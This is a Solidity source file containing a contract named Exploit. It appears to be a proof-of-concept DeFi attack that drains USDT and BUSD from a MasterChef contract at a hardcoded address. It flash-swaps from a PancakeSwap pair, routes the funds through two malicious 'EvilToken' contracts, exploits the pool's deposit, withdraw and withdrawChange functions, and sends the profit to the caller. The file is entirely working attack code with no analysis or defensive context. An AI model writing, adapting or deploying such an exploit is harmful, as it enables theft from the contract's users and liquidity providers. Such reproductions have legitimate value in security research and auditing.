//SPDX-License-Identifier: Unlicense
pragma solidity ^0.8.4;

import "./IERC20.sol";
import "./EvilToken.sol";

interface IPancakePair {
    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;
}
contract Exploit {
    IPancakePair pair = IPancakePair(0x7EFaEf62fDdCCa950418312c6C91Aef321375A00);
    IERC20 usdt = IERC20(0x55d398326f99059fF775485246999027B3197955);
    IERC20 busd = IERC20(0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56);
    IMasterChef masterchef = IMasterChef(0x633Fa755a83B015cCcDc451F82C57EA0Bd32b4B4);
    EvilToken token0;
    EvilToken token1;

    constructor(){
        token0 = new EvilToken(IMasterChef(address(0)));
        token1 = new EvilToken(masterchef);
    }

    function attack() public{
        pair.swap(10000*1e18,10000*1e18,address(this),new bytes(1));
    }

    function pancakeCall(address sender, uint amount0, uint amount1, bytes calldata data) public{
        usdt.transfer(address(token1),usdt.balanceOf(address(this)));
        busd.transfer(address(token1),busd.balanceOf(address(this)));
        masterchef.depositByAddLiquidity(18,[address(token0),address(token1)],[uint256(1),uint256(1)]);
        (uint256 _amount,) = masterchef.userInfo(18,address(this));
        masterchef.withdrawAndRemoveLiquidity(18,_amount,false);
        address[] memory t = new address[](2);
        t[0] = address(busd);
        t[1] = address(usdt);
        masterchef.withdrawChange(t);
        token1.redeem();
        usdt.transfer(msg.sender,(amount0/9975*10000)+10000);
        busd.transfer(msg.sender,(amount1/9975*10000)+10000);
        usdt.transfer(tx.origin,usdt.balanceOf(address(this)));
        busd.transfer(tx.origin,busd.balanceOf(address(this)));
    }

}
